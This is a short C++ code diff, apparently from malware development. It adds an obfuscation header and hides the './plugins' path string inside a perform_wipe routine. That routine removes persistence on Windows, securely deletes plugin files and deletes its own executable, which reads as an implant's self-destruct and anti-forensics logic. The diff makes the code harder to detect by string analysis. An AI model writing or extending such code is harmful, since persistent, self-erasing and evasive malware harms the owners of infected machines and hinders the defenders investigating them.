@@ -2,6 +2,7 @@
 #include "PersistenceModule.h"
 #include <filesystem>
 #include <fstream>
+#include "Obfuscation.h"
 #include <random>
 #include <iostream>
 #ifdef _WIN32
@@ -51,7 +52,7 @@ void perform_wipe() {
 #ifdef _WIN32
     remove_persistence();
 #endif
-    for(const auto& entry : fs::directory_iterator("./plugins")) {
+    for(const auto& entry : fs::directory_iterator(OBFUSCATE("./plugins"))) {
         secure_delete(entry.path());
     }
     secure_delete(exec_path());
